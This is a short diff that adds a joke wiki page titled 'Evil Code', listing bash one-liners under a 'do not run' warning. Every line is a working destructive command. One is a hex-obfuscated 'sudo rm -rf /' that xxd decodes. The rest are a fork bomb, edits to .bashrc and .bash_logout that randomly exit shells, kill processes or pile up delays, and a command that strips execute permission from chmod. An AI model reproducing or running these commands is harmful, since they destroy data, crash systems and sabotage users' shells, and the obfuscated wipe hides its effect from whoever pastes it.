@@ -1,0 +1,18 @@
+created: 20200319030534077
+modified: 20200319140715550
+tags: Humor j3d1h bash 1uxb0x
+title: Evil Code
+
+//Obviously, do not run this code.//
+
+`$(echo 7375646f20726d202d7266202f202d2d6e6f2d70726573657276652d726f6f74 | xxd -r -p)`
+
+`:(){:|: &};:`
+
+`echo "echo 'sleep 1' >> ~/.bashrc" >> ~/.bash_logout`
+
+`echo "trap '[ "$RANDOM" -le 983 ] && exit' DEBUG" >> ~/.bashrc`
+
+`echo 'export PROMPT_COMMAND="kill -9 $RANDOM 2>/dev/null"' >> ~/.bashrc`
+
+`sudo chmod -x chmod`
